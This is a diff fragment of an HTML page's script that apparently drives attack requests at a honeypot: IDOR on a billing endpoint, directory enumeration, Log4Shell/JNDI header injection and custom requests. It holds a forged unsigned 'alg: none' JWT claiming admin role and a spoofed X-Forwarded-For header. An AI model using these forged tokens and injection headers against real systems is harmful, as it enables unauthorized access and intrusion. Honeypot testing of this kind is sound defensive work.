+  const fields = document.getElementById('idor-fields').value || 'name,email';
+  const r = await honeypotFetch(`/api/v2/users/${uid}/billing?include=${encodeURIComponent(fields)}`, {
+    headers: {
+      'Authorization': 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiMSIsInJvbGUiOiJhZG1pbiJ9.',
+      'X-Forwarded-For': '10.0.0.1'
+    }
+  });
+  showResponse('resp-idor', r.status, r.data);
+}
+
+// 10. Directory Enum
+async function doEnum() {
+  const path = document.getElementById('enum-input').value;
+  const r = await honeypotFetch(path);
+  showResponse('resp-enum', r.status, r.data);
+}
+
+// 11. Log4Shell / JNDI
+async function doJNDI() {
+  const ver = document.getElementById('jndi-input').value;
+  const r = await honeypotFetch('/api/v2/search?q=healthcheck', {
+    headers: {
+      'X-Api-Version': ver,
+      'User-Agent': ver,
+      'Referer': ver
+    }
+  });
+  showResponse('resp-jndi', r.status, r.data);
+}
+
+// 12. Custom
+async function doCustom() {
+  const method = document.getElementById('custom-method').value;
+  const ep = document.getElementById('custom-endpoint').value || '/';
+  const body = document.getElementById('custom-body').value;
+  const opts = { method };
+  if (body && method !== 'GET') {
+    opts.headers = { 'Content-Type': 'application/json' };
+    opts.body = body;
+  }
+  const r = await honeypotFetch(ep, opts);
+  showResponse('resp-custom', r.status, r.data);
+}
+</script>
+</body>
+</html>
